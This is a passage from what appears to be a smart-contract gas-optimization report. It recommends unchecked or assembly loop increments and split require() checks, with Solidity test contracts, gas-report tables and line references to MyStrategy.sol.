\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines - MyStrategy.sol:303  - MyStrategy.sol:322   --- ## `unchecked{++i}` instead of `i++` (or use assembly when applicable)  Use `++i` instead of `i++`. This is especially useful in for loops but this optimization can be used anywhere in your code. You can also use `unchecked{++i;}` for even more gas savings but this will not check to see if `i` overflows. For extra safety if you are worried about this, you can add a require statement after the loop checking if `i` is equal to the final incremented value. For best gas savings, use inline assembly, however this limits the functionality you can achieve. For example you cant use Solidity syntax to internally call your own contract within an assembly block and external calls must be done with the `call()` or `delegatecall()` instruction. However when applicable, inline assembly will save much more gas.  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;     Contract4 c4;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();         c4 = new Contract4();     }      function testGas() public {         c0.iPlusPlus();         c1.plusPlusI();         c2.uncheckedPlusPlusI();         c3.safeUncheckedPlusPlusI();         c4.inlineAssemblyLoop();     } }  contract Contract0 {     //loop with i++     function iPlusPlus() public pure {         uint256 j = 0;         for (uint256 i; i < 10; i++) {             j++;         }     } }  contract Contract1 {     //loop with ++i     function plusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ++i) {             j++;         }     } }  contract Contract2 {     //loop with unchecked{++i}     function uncheckedPlusPlusI() public pure {         uint256 j = 0;         for (uint256 i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }     } }  contract Contract3 {     //loop with unchecked{++i} with additional overflow check     function safeUncheckedPlusPlusI() public pure {         uint256 j = 0;         uint256 i = 0;         for (i; i < 10; ) {             j++;              unchecked {                 ++i;             }         }          //check for overflow         assembly {             if lt(i, 10) {                 mstore(0x00, \"loop overflow\")                 revert(0x00, 0x20)             }         }     } }  contract Contract4 {     //loop with inline assembly     function inlineAssemblyLoop() public pure {         assembly {             let j := 0              for {                 let i := 0             } lt(i, 10) {                 i := add(i, 0x01)             } {                 j := add(j, 0x01)             }         }     } }  ```  ### Gas Report  ```js  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37687              \u2506 219             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 iPlusPlus          \u2506 2039            \u2506 2039 \u2506 2039   \u2506 2039 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 37287              \u2506 217             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 plusPlusI          \u2506 1989            \u2506 1989 \u2506 1989   \u2506 1989 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract3 contract     \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost        \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 42693                  \u2506 244             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name          \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 safeUncheckedPlusPlusI \u2506 1355            \u2506 1355 \u2506 1355   \u2506 1355 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract2 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 35887              \u2506 210             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 uncheckedPlusPlusI \u2506 1329            \u2506 1329 \u2506 1329   \u2506 1329 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract4 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 26881              \u2506 164             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 inlineAssemblyLoop \u2506 709             \u2506 709 \u2506 709    \u2506 709 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines - MyStrategy.sol:118  - MyStrategy.sol:153  - MyStrategy.sol:300  - MyStrategy.sol:317   --- ## Use multiple `require()` statments insted of `require(expression && expression && ...)`  ```js contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.singleRequire(3);         c1.multipleRequire(3);     } }  contract Contract0 {     function singleRequire(uint256 num) public {         require(num > 1 && num < 10 && num == 3);     } }  contract Contract1 {     function multipleRequire(uint256 num) public {         require(num > 1);         require(num < 10);         require(num == 3);     } } ```  ### Gas Report  ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract0 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 35487              \u2506 208             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 singleRequire      \u2506 286             \u2506 286 \u2506 286    \u2506 286 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 35887              \u2506 210             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 